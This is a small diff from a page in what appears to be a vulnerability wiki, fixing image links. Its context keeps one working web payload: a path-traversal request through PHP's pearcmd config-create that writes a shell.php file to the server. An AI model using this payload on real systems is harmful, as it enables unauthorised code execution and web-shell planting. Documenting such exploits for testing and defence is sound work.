@@ -24,4 +24,5 @@
 /public/index.php?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php
 ```
 
-![img](../../../.vuepress/public/img/1671154607827-3548f528-c745-4ed1-994a-8aee9850ddee.png)![img](/assets/PeiQi-Wiki/img/1671154706972-596ab1d0-26ce-428b-a54b-b94ddaf4e8ef.png)
+![img](/assets/PeiQi-Wiki/img/1671154607827-3548f528-c745-4ed1-994a-8aee9850ddee.png)
+![img](/assets/PeiQi-Wiki/img/1671154706972-596ab1d0-26ce-428b-a54b-b94ddaf4e8ef.png)
